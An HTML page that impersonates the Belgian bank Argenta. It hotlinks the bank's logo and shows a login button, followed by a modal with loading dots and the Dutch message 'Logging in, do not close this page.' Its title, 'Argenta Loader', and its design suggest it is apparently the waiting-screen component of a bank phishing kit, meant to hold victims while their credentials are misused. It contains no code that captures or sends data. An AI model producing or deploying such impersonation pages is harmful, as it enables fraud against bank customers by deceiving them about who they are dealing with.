<!DOCTYPE html>
<html>
  <head>
    <title>Argenta Loader srang</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      button {
        display: inline-block;
        background-color: #004a65;
        color: white;
        border: none;
        padding: 16px 32px;
        text-align: center;
        text-decoration: none;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        box-shadow: 2px 2px 4px rgba(0,0,0,0.3);
      }
      /* Modal styles */
      .modal {
        display: none;
        position: fixed;
        z-index: 1;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0,0,0,0.5);
      }
      .modal-content {
        background-color: white;
        margin: 10% auto;
        padding: 20px;
        border-radius: 4px;
        width: 50%;
        text-align: center;
        position: relative;
      }
     .loading-circle {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 20px;
}

.dot {
  display: inline-block;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background-color: #004a65;
  margin: 0 8px;
  animation: bounce 0.5s infinite alternate;
}

.dot:nth-child(2) {
  animation-delay: 0.1s;
}

.dot:nth-child(3) {
  animation-delay: 0.2s;
}

@keyframes bounce {
  0% {
    transform: translateY(0);
  }
  100% {
    transform: translateY(-12px);
  }
}

      /* Logo styles */
      img {
        width: 150px;
        height: auto;
      }
    </style>
  </head>
  <body>
    <button onclick="openModal()">Aanmelden</button>
    
    <div class="modal" id="myModal">
      <div class="modal-content">
        <img src="https://www.argenta.be/etc.clientlibs/argenta/clientlibs/clientlib-site/resources/img/argenta-logo-facebook.png" alt="Argenta logo" />
        <br>
        <br>
         <br>
        <div class="loading-dots">
          <div class="dot"></div>
          <div class="dot"></div>
          <div class="dot"></div>
        </div>

        <p style="color: #004a65; font-size: 16px; font-family: Arial, sans-serif;">Bezig met aanmelden, sluit deze pagina niet.</p>

      </div>
    </div>
    
    <script>
      function openModal() {
        document.getElementById("myModal").style.display = "block";
      }
    </script>
  </body>
</html>
